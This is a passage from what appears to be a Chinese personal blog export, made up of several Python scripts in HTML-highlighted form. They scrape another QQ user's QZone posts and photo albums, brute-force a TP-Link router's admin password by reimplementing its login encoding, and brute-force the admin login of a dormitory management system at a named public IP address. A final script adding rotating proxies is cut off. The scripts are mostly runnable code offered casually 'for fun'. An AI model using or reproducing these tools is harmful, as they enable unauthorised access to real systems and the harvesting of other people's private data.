class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        driver.find_element_by_id(<span class="string">&#x27;QM_OwnerInfo_Icon&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;登陆完成....&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> driver</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;不能访问&#x27;</span> + business_qq)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 抓取说说</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_shuoshuo</span>(<span class="params">driver</span>):</span></span><br><span class="line">    page = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 下拉滚动条</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">            driver.execute_script(<span class="string">&quot;window.scrollBy(0,5000)&quot;</span>)</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 切换 frame</span></span><br><span class="line">        driver.switch_to.frame(<span class="string">&#x27;app_canvas_frame&#x27;</span>)</span><br><span class="line">        <span class="comment"># 构建 BeautifulSoup 对象</span></span><br><span class="line">        bs = BeautifulSoup(driver.page_source.encode(<span class="string">&#x27;GBK&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>).decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line">        <span class="comment"># 找到页面上的所有说说</span></span><br><span class="line">        pres = bs.find_all(<span class="string">&#x27;pre&#x27;</span>, class_=<span class="string">&#x27;content&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> pre <span class="keyword">in</span> pres:</span><br><span class="line">            shuoshuo = pre.text</span><br><span class="line">            tx = pre.parent.parent.find(<span class="string">&#x27;a&#x27;</span>, class_=<span class="string">&quot;c_tx c_tx3 goDetail&quot;</span>)[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">            <span class="built_in">print</span>(tx + <span class="string">&quot;:&quot;</span> + shuoshuo)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;她的空间动态.txt&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">&#x27;\n&#x27;</span> + tx + <span class="string">&quot;:&quot;</span> + shuoshuo + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                f.close()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 页数判断</span></span><br><span class="line">        page = page + <span class="number">1</span></span><br><span class="line">        maxPage = bs.find(<span class="string">&#x27;a&#x27;</span>, title=<span class="string">&#x27;末页&#x27;</span>).text</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(maxPage) &lt; page:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        driver.find_element_by_link_text(<span class="string">u&#x27;下一页&#x27;</span>).click()</span><br><span class="line">        <span class="comment"># 回到主文档</span></span><br><span class="line">        driver.switch_to.default_content()</span><br><span class="line">        <span class="comment"># 等待页面加载</span></span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计数函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num</span>(<span class="params">name_a</span>):</span></span><br><span class="line">    name_a+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> name_a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载图片  单个相册中点击图片</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_photo</span>(<span class="params">driver</span>):</span></span><br><span class="line">    <span class="comment"># 照片下载路径</span></span><br><span class="line"></span><br><span class="line">    photo_path = <span class="string">r&quot;E:\DC\2548957387\&#123;&#125;.jpg&quot;</span></span><br><span class="line">    mkdir_path = <span class="string">r&#x27;E:\DC\2548957387&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(mkdir_path):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        mkdir_path = os.mkdir(<span class="string">r&#x27;E:\DC\2548957387&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 相册索引</span></span><br><span class="line">    photoIndex = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 回到主文档</span></span><br><span class="line">        driver.switch_to.default_content()</span><br><span class="line">        <span class="comment"># driver.switch_to.parent_frame()</span></span><br><span class="line">        <span class="comment"># 点击头部的相册按钮</span></span><br><span class="line">        driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;menuContainer&quot;]/div/ul/li[3]/a&#x27;</span>).click()</span><br><span class="line">        <span class="comment"># 等待加载</span></span><br><span class="line">        driver.implicitly_wait(<span class="number">10</span>)</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">        <span class="comment"># 切换 frame</span></span><br><span class="line">        driver.switch_to.frame(<span class="string">&#x27;app_canvas_frame&#x27;</span>)</span><br><span class="line">        <span class="comment"># 各个相册的超链接</span></span><br><span class="line">        a = driver.find_elements_by_class_name(<span class="string">&#x27;album-cover&#x27;</span>)</span><br><span class="line">        <span class="comment"># 单个相册</span></span><br><span class="line">        a[photoIndex].click()</span><br><span class="line">        <span class="comment"># 隐式等待，5秒钟内只要找到了元素就开始执行，10秒钟后未找到，就超时；</span></span><br><span class="line">        driver.implicitly_wait(<span class="number">10</span>)</span><br><span class="line">        <span class="comment"># 等待10秒</span></span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">        <span class="comment"># 相册的第一张图</span></span><br><span class="line">        p = driver.find_elements_by_class_name(<span class="string">&#x27;item-cover&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        p.click()</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 相册大图在父frame，切换到父frame</span></span><br><span class="line">        driver.switch_to.parent_frame()</span><br><span class="line">        <span class="comment"># 循环相册中的照片</span></span><br><span class="line">        name_a = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 照片url地址和名称</span></span><br><span class="line">            <span class="comment"># img = driver.find_element_by_id(&#x27;js-img-disp&#x27;)</span></span><br><span class="line">            img = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;js-img-border&quot;]/img&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(img)</span><br><span class="line">            src = img.get_attribute(<span class="string">&#x27;src&#x27;</span>).replace(<span class="string">&#x27;&amp;t=5&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            name = driver.find_element_by_id(<span class="string">&quot;js-photo-name&quot;</span>).text</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 下载</span></span><br><span class="line">            <span class="built_in">print</span>(src)</span><br><span class="line">            <span class="built_in">print</span>(photo_path.<span class="built_in">format</span>(name))</span><br><span class="line"></span><br><span class="line">            req = requests.get(src)</span><br><span class="line">            name_a+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(photo_path.<span class="built_in">format</span>(name + <span class="string">&quot;-&quot;</span> + <span class="built_in">str</span>(name_a)),<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(req.content)</span><br><span class="line">                f.close()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;第 &#123;&#125; 张，已下载！！！！&quot;</span>.<span class="built_in">format</span>(name_a))</span><br><span class="line">            <span class="comment"># urlretrieve(src,photo_path.format(miss_qq,name))</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 取下面的 当前照片张数/总照片数量</span></span><br><span class="line">            counts = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;js-ctn-infoBar&quot;]/div/div[1]/span&#x27;</span>).text</span><br><span class="line">            <span class="built_in">print</span>(counts + <span class="string">&quot;张！&quot;</span>)</span><br><span class="line"></span><br><span class="line">            counts = counts.split(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">            <span class="comment"># 最后一张的时候退出照片浏览</span></span><br><span class="line">            <span class="keyword">if</span> counts[<span class="number">0</span>] == counts[<span class="number">1</span>]:</span><br><span class="line">                <span class="comment"># 右上角的 X 按钮</span></span><br><span class="line">                driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;js-viewer-main&quot;]/div[1]/a&#x27;</span>).click()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;右上角x&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># 点击 下一张，网页加载慢，所以10次加载</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> (<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">                <span class="keyword">if</span> driver.find_element_by_id(<span class="string">&#x27;js-btn-nextPhoto&#x27;</span>):</span><br><span class="line">                    n = driver.find_element_by_id(<span class="string">&#x27;js-btn-nextPhoto&#x27;</span>)</span><br><span class="line">                    ActionChains(driver).click(n).perform()</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;等待1秒，点击下一张.....&quot;</span>)</span><br><span class="line">                    time.sleep(<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    time.sleep(<span class="number">5</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;否则time5秒&quot;</span>)</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># 相册数量比较，是否下载了全部的相册</span></span><br><span class="line">        photoIndex = photoIndex + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a) &lt;= photoIndex:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 输入QQ信息</span></span><br><span class="line">    qq_num = <span class="built_in">input</span>(<span class="string">&quot;请输入自己的QQ：&quot;</span>)</span><br><span class="line">    qq_pwd = <span class="built_in">input</span>(<span class="string">&quot;请输入自己的QQ密码：&quot;</span>)</span><br><span class="line">    miss_qq = <span class="built_in">input</span>(<span class="string">&quot;请输入要查看的QQ：&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 标识 当前目录</span></span><br><span class="line">    path = os.getcwd()</span><br><span class="line">    url = <span class="string">&quot;https://www.ispfsb.com/Public/FOID.aspx&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 去除浏览器被控  字样</span></span><br><span class="line">    options = webdriver.ChromeOptions()</span><br><span class="line">    options.add_experimental_option(<span class="string">&quot;excludeSwitches&quot;</span>, [<span class="string">&#x27;enable-automation&#x27;</span>])</span><br><span class="line">    options.add_experimental_option(<span class="string">&#x27;useAutomationExtension&#x27;</span>, <span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># 浏览器扩展程序</span></span><br><span class="line">    <span class="comment"># 语音识别程序</span></span><br><span class="line">    <span class="comment"># extension_path1 = &#x27;./1.2.2_0.crx&#x27;</span></span><br><span class="line">    <span class="comment"># xpath程序</span></span><br><span class="line">    extension_path2 = <span class="string">&#x27;./2.1.0.0_0.crx&#x27;</span></span><br><span class="line">    <span class="comment"># options.add_extension(extension_path1)</span></span><br><span class="line">    options.add_extension(extension_path2)</span><br><span class="line">    driver = webdriver.Chrome(options=options)  <span class="comment"># driver = webdriver.Chrome(executable_path=r&#x27;D:PATHchromedriver.exe&#x27;)?</span></span><br><span class="line">    driver.maximize_window()</span><br><span class="line">    <span class="comment"># 登陆</span></span><br><span class="line">    login(qq_num, qq_pwd, miss_qq)</span><br><span class="line">    <span class="comment"># 爬取说说</span></span><br><span class="line">    get_shuoshuo(driver)</span><br><span class="line"></span><br></pre></td></tr></table></figure>























]]></content>
      <categories>
        <category>嗯哼</category>
      </categories>
      <tags>
        <tag>无聊</tag>
      </tags>
  </entry>
  <entry>
    <title>TP-Link路由器后台密码爆破</title>
    <url>//TP-Link%E8%B7%AF%E7%94%B1%E5%99%A8%E5%90%8E%E5%8F%B0%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4</url>
    <content><![CDATA[<h1 id="TP-Link路由器后台密码爆破"><a href="#TP-Link路由器后台密码爆破" class="headerlink" title="TP-Link路由器后台密码爆破"></a>TP-Link路由器后台密码爆破</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问测试</span></span><br><span class="line"><span class="comment"># url = &quot;http://192.168.1.1/&quot;</span></span><br><span class="line"><span class="comment"># r = requests.get(url)</span></span><br><span class="line"><span class="comment"># print(&quot;状态码：&quot;,r)</span></span><br><span class="line"><span class="comment"># print(&quot;网页内容：&quot;,r.text)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 装饰器 计算时间</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">time_out</span>(<span class="params">a_func</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clocked</span>(<span class="params">*args, **kwargs</span>):</span></span><br><span class="line">        start = time.time()</span><br><span class="line">        result = a_func(*args, **kwargs)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;程序：&quot;</span> + a_func.__name__,<span class="string">&quot;    运行时间：&quot;</span> + <span class="built_in">str</span>(end - start))</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> clocked</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># js逆向 路由器密码加密方式</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">security_encode</span>(<span class="params">b</span>):</span></span><br><span class="line">    a = <span class="string">&#x27;RDpbLfCPsJZ7fiv&#x27;</span></span><br><span class="line">    c = <span class="string">&#x27;yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW&#x27;</span></span><br><span class="line"></span><br><span class="line">    e = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    g = <span class="built_in">len</span>(a)</span><br><span class="line">    h = <span class="built_in">len</span>(b)</span><br><span class="line">    k = <span class="built_in">len</span>(c)</span><br><span class="line"></span><br><span class="line">    f = g <span class="keyword">if</span> g &gt; h <span class="keyword">else</span> h</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(f):</span><br><span class="line">        n = l = <span class="number">187</span></span><br><span class="line">        <span class="keyword">if</span> p &gt;= g:</span><br><span class="line">            n = <span class="built_in">ord</span>(b[p])</span><br><span class="line">        <span class="keyword">elif</span> p &gt;= h:</span><br><span class="line">            l = <span class="built_in">ord</span>(a[p])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = <span class="built_in">ord</span>(a[p])</span><br><span class="line">            n = <span class="built_in">ord</span>(b[p])</span><br><span class="line">        e += c[((l ^ n) % k)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用加密后的密码开始登陆路由器后台</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">password</span>):</span></span><br><span class="line">    requests.get(<span class="string">&#x27;http://192.168.1.1&#x27;</span>, headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;)</span><br><span class="line">    r = requests.post(<span class="string">&#x27;http://192.168.1.1&#x27;</span>, json=&#123;<span class="string">&quot;method&quot;</span>: <span class="string">&quot;do&quot;</span>, <span class="string">&quot;login&quot;</span>: &#123;<span class="string">&quot;password&quot;</span>: security_encode(password)&#125;&#125;)</span><br><span class="line"></span><br><span class="line">    code = r.status_code</span><br><span class="line">    <span class="keyword">if</span> code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;状态码：&#x27;</span>,code,<span class="string">&quot;密码正确，登陆成功！！！！！！！&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;状态码：&#x27;</span>, code, <span class="string">&quot;密码错误，继续尝试登陆.......&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"><span class="comment"># 密码字典  生成密码</span></span><br><span class="line"><span class="meta">@time_out</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_z_Z_symbol</span>(<span class="params">a=<span class="number">5</span>,count=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    我认为的所有密码：</span></span><br><span class="line"><span class="string">    数字 + 小写字母 + 大写字母 + 符号...</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># chars = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&amp;*?_-.&quot;</span></span><br><span class="line">    chars = <span class="string">&quot;0123456789&quot;</span>  <span class="comment"># 上面字典生成的密码太多了 先用纯数字玩玩吧  纯属娱乐  改天认真了买几十台服务器  分布式爆破</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./tplinkpasswd.txt&quot;</span>,<span class="string">&quot;a&quot;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">17</span>):  <span class="comment"># 密码长度  从6位数开始  16位数密码结束</span></span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> itertools.product(chars, repeat=i):</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                password = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;*************** 第 &#x27;</span> + <span class="built_in">str</span>(count) + <span class="string">&#x27; 组密码 ***************&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(password)</span><br><span class="line">                <span class="comment"># e = security_encode(password)</span></span><br><span class="line">                <span class="keyword">if</span> login(password) == <span class="number">200</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;密码破解成功，程序退出！&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(password)</span><br><span class="line">                    f.write(password+<span class="string">r&#x27;\n&#x27;</span>)</span><br><span class="line">                    f.close()</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始破解</span></span><br><span class="line">    num_z_Z_symbol()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

































]]></content>
      <categories>
        <category>嗯哼</category>
      </categories>
      <tags>
        <tag>无聊</tag>
      </tags>
  </entry>
  <entry>
    <title>某厂区宿舍管理后台密码爆破-selenium测试</title>
    <url>//%E6%9F%90%E5%8E%82%E5%8C%BA%E5%AE%BF%E8%88%8D%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-selenium%E6%B5%8B%E8%AF%95</url>
    <content><![CDATA[<h1 id="某厂区宿舍管理后台密码爆破-selenium测试"><a href="#某厂区宿舍管理后台密码爆破-selenium测试" class="headerlink" title="某厂区宿舍管理后台密码爆破-selenium测试"></a>某厂区宿舍管理后台密码爆破-selenium测试</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 装饰器 计算时间</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">time_out</span>(<span class="params">a_func</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clocked</span>(<span class="params">*args, **kwargs</span>):</span></span><br><span class="line">        start = time.time()</span><br><span class="line">        result = a_func(*args, **kwargs)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;程序：&quot;</span> + a_func.__name__, <span class="string">&quot;    运行时间：&quot;</span> + <span class="built_in">str</span>(end - start))</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clocked</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求方法</span></span><br><span class="line"><span class="meta">@time_out</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">driver, url, count, use</span>):</span></span><br><span class="line">    driver.get(url)</span><br><span class="line">    driver.implicitly_wait(<span class="number">10</span>)</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    数字 + 小写字母 + 大写字母 + 符号</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    chars = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&amp;*?_-.&quot;</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>,<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> itertools.product(chars, repeat=a):</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            password = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">            driver.implicitly_wait(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;................................开始自动填充密码 爆破中.......................................&quot;</span>)</span><br><span class="line">            <span class="comment"># 用户名 admin</span></span><br><span class="line">            user = driver.find_element_by_id(<span class="string">&quot;txtUserName&quot;</span>)</span><br><span class="line">            user.click()</span><br><span class="line">            user.clear()</span><br><span class="line">            user.send_keys(use)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 密码爆破开始</span></span><br><span class="line">            paswd = driver.find_element_by_id(<span class="string">&quot;txtPwd&quot;</span>)</span><br><span class="line">            paswd.click()</span><br><span class="line">            paswd.clear()</span><br><span class="line">            <span class="comment"># 页面输入密码</span></span><br><span class="line">            paswd.send_keys(password)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 网页 js 密码注入</span></span><br><span class="line">            <span class="comment"># js_code = &#x27;document.getElementById(&quot;lgPwd&quot;).innerHTML=&quot;&#123;&#125;&quot;;&#x27;.format(password)</span></span><br><span class="line">            <span class="comment"># print(js_code)</span></span><br><span class="line">            <span class="comment"># driver.execute_script(js_code)</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 点击登陆按钮</span></span><br><span class="line">            driver.find_element_by_id(<span class="string">&quot;btnLogin&quot;</span>).click()</span><br><span class="line">            driver.implicitly_wait(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 关闭密码错误提示框</span></span><br><span class="line">            <span class="comment"># driver.find_element_by_css_selector(&#x27;#pop_163370375869635439 &gt; div.popBox &gt; div.ttBox &gt; a&#x27;).click()</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 刷新界面</span></span><br><span class="line">            driver.refresh()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;*************** 第 &#x27;</span> + <span class="built_in">str</span>(count) + <span class="string">&#x27; 组密码 ***************&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;当前 &quot;</span>,a,<span class="string">&quot;  位密码测试&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;用户名：&quot;</span>,use)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;密码：&quot;</span>,password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 程序入口</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 标识 当前目录</span></span><br><span class="line">    <span class="comment"># url = &quot;http://tplogin.cn/&quot;</span></span><br><span class="line">    url = <span class="string">&quot;http://183.230.147.88:8081/&quot;</span></span><br><span class="line">    use = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 去除浏览器被控  字样</span></span><br><span class="line">    options = webdriver.ChromeOptions()</span><br><span class="line">    options.add_experimental_option(<span class="string">&quot;excludeSwitches&quot;</span>, [<span class="string">&#x27;enable-automation&#x27;</span>])</span><br><span class="line">    options.add_experimental_option(<span class="string">&#x27;useAutomationExtension&#x27;</span>, <span class="literal">False</span>)</span><br><span class="line">    driver = webdriver.Chrome(options=options)  <span class="comment"># driver = webdriver.Chrome(executable_path=r&#x27;D:PATHchromedriver.exe&#x27;)?</span></span><br><span class="line"></span><br><span class="line">    get(driver, url,count,use)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

































]]></content>
      <categories>
        <category>嗯哼</category>
      </categories>
      <tags>
        <tag>无聊</tag>
      </tags>
  </entry>
  <entry>
    <title>某厂区宿舍管理后台密码爆破</title>
    <url>//%E6%9F%90%E5%8E%82%E5%8C%BA%E5%AE%BF%E8%88%8D%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4</url>
    <content><![CDATA[<h1 id="某厂区宿舍管理后台密码爆破"><a href="#某厂区宿舍管理后台密码爆破" class="headerlink" title="某厂区宿舍管理后台密码爆破"></a>某厂区宿舍管理后台密码爆破</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> fake_useragent</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问测试</span></span><br><span class="line"><span class="comment"># url = &quot;http://192.168.1.1/&quot;</span></span><br><span class="line"><span class="comment"># r = requests.get(url)</span></span><br><span class="line"><span class="comment"># print(&quot;状态码：&quot;,r)</span></span><br><span class="line"><span class="comment"># print(&quot;网页内容：&quot;,r.text)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 装饰器 计算时间</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">time_out</span>(<span class="params">a_func</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clocked</span>(<span class="params">*args, **kwargs</span>):</span></span><br><span class="line">        start = time.time()</span><br><span class="line">        result = a_func(*args, **kwargs)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;程序：&quot;</span> + a_func.__name__,<span class="string">&quot;    运行时间：&quot;</span> + <span class="built_in">str</span>(end - start))</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> clocked</span><br><span class="line"></span><br><span class="line"><span class="comment"># ip代理</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ip_out</span>():</span></span><br><span class="line">    url = <span class="string">&quot;http://proxy.httpdaili.com/apinew.asp?sl=3&amp;noinfo=true&amp;text=1&amp;ddbh=1420927609453534893&quot;</span></span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;代理ip状态码：&quot;</span>, r.status_code)</span><br><span class="line">    t = r.text</span><br><span class="line">    <span class="comment"># 正则匹配ip段and端口号</span></span><br><span class="line">    ips = re.findall(<span 